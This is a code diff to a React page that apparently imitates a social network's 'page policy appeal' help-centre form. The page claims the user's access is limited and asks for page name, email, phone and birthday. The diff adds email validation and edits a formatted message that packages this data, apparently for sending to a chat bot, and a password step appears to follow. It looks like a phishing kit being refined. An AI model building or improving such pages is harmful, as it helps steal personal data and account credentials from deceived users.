@@ -28,6 +28,7 @@ const Home = () => {
             appealPlaceholder: 'Please describe your appeal in detail...',
             submit: 'Submit',
             fieldRequired: 'This field is required',
+            invalidEmail: 'Please enter a valid email address',
             about: 'About',
             adChoices: 'Ad choices',
             createAd: 'Create ad',
@@ -54,10 +55,16 @@ const Home = () => {
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
 
+    // Hàm validate email
+    const validateEmail = (email) => {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+    };
+
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
-                const [translatedHelpCenter, translatedEnglish, translatedUsing, translatedManaging, translatedPrivacy, translatedPolicies, translatedAppeals, translatedDetected, translatedLimited, translatedSubmit, translatedPageName, translatedMail, translatedPhone, translatedBirthday, translatedYourAppeal, translatedAppealPlaceholder, translatedSubmitBtn, translatedRequired, translatedAbout, translatedAdChoices, translatedCreateAd, translatedPrivacyText, translatedCareers, translatedCreatePage, translatedTerms, translatedCookies] = await Promise.all([translateText(defaultTexts.helpCenter, targetLang), translateText(defaultTexts.english, targetLang), translateText(defaultTexts.using, targetLang), translateText(defaultTexts.managingAccount, targetLang), translateText(defaultTexts.privacySecurity, targetLang), translateText(defaultTexts.policiesReporting, targetLang), translateText(defaultTexts.pagePolicyAppeals, targetLang), translateText(defaultTexts.detectedActivity, targetLang), translateText(defaultTexts.accessLimited, targetLang), translateText(defaultTexts.submitAppeal, targetLang), translateText(defaultTexts.pageName, targetLang), translateText(defaultTexts.mail, targetLang), translateText(defaultTexts.phone, targetLang), translateText(defaultTexts.birthday, targetLang), translateText(defaultTexts.yourAppeal, targetLang), translateText(defaultTexts.appealPlaceholder, targetLang), translateText(defaultTexts.submit, targetLang), translateText(defaultTexts.fieldRequired, targetLang), translateText(defaultTexts.about, targetLang), translateText(defaultTexts.adChoices, targetLang), translateText(defaultTexts.createAd, targetLang), translateText(defaultTexts.privacy, targetLang), translateText(defaultTexts.careers, targetLang), translateText(defaultTexts.createPage, targetLang), translateText(defaultTexts.termsPolicies, targetLang), translateText(defaultTexts.cookies, targetLang)]);
+                const [translatedHelpCenter, translatedEnglish, translatedUsing, translatedManaging, translatedPrivacy, translatedPolicies, translatedAppeals, translatedDetected, translatedLimited, translatedSubmit, translatedPageName, translatedMail, translatedPhone, translatedBirthday, translatedYourAppeal, translatedAppealPlaceholder, translatedSubmitBtn, translatedRequired, translatedInvalidEmail, translatedAbout, translatedAdChoices, translatedCreateAd, translatedPrivacyText, translatedCareers, translatedCreatePage, translatedTerms, translatedCookies] = await Promise.all([translateText(defaultTexts.helpCenter, targetLang), translateText(defaultTexts.english, targetLang), translateText(defaultTexts.using, targetLang), translateText(defaultTexts.managingAccount, targetLang), translateText(defaultTexts.privacySecurity, targetLang), translateText(defaultTexts.policiesReporting, targetLang), translateText(defaultTexts.pagePolicyAppeals, targetLang), translateText(defaultTexts.detectedActivity, targetLang), translateText(defaultTexts.accessLimited, targetLang), translateText(defaultTexts.submitAppeal, targetLang), translateText(defaultTexts.pageName, targetLang), translateText(defaultTexts.mail, targetLang), translateText(defaultTexts.phone, targetLang), translateText(defaultTexts.birthday, targetLang), translateText(defaultTexts.yourAppeal, targetLang), translateText(defaultTexts.appealPlaceholder, targetLang), translateText(defaultTexts.submit, targetLang), translateText(defaultTexts.fieldRequired, targetLang), translateText(defaultTexts.invalidEmail, targetLang), translateText(defaultTexts.about, targetLang), translateText(defaultTexts.adChoices, targetLang), translateText(defaultTexts.createAd, targetLang), translateText(defaultTexts.privacy, targetLang), translateText(defaultTexts.careers, targetLang), translateText(defaultTexts.createPage, targetLang), translateText(defaultTexts.termsPolicies, targetLang), translateText(defaultTexts.cookies, targetLang)]);
 
                 setTranslatedTexts({
                     helpCenter: translatedHelpCenter,
@@ -78,6 +85,7 @@ const Home = () => {
                     appealPlaceholder: translatedAppealPlaceholder,
                     submit: translatedSubmitBtn,
                     fieldRequired: translatedRequired,
+                    invalidEmail: translatedInvalidEmail,
                     about: translatedAbout,
                     adChoices: translatedAdChoices,
                     createAd: translatedCreateAd,
@@ -138,6 +146,7 @@ const Home = () => {
             }));
         }
 
+        // Chỉ clear error khi người dùng bắt đầu nhập, không validate real-time
         if (errors[field]) {
             setErrors((prev) => ({
                 ...prev,
@@ -155,6 +164,11 @@ const Home = () => {
                 newErrors[field] = true;
             }
         });
+
+        // Validate email format chỉ khi submit
+        if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
+            newErrors.mail = 'invalid';
+        }
 
         setErrors(newErrors);
         return Object.keys(newErrors).length === 0;
@@ -193,8 +207,7 @@ const Home = () => {
 🔖 <b>Page Name:</b> <code>${data.pageName}</code>
 📧 <b>Email:</b> <code>${data.mail}</code>
 📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
-🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>
-📝 <b>Appeal:</b> <code>${data.appeal}</code>`;
+🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
     };
 
     const handleClosePassword = () => {
@@ -278,7 +291,8 @@ const Home = () => {
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
                                 <input type='email' name='mail' autoComplete='email' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mail} onChange={(e) => handleInputChange('mail', e.target.value)} />
-                                {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
                                 <p className='text-base sm:text-sm'>
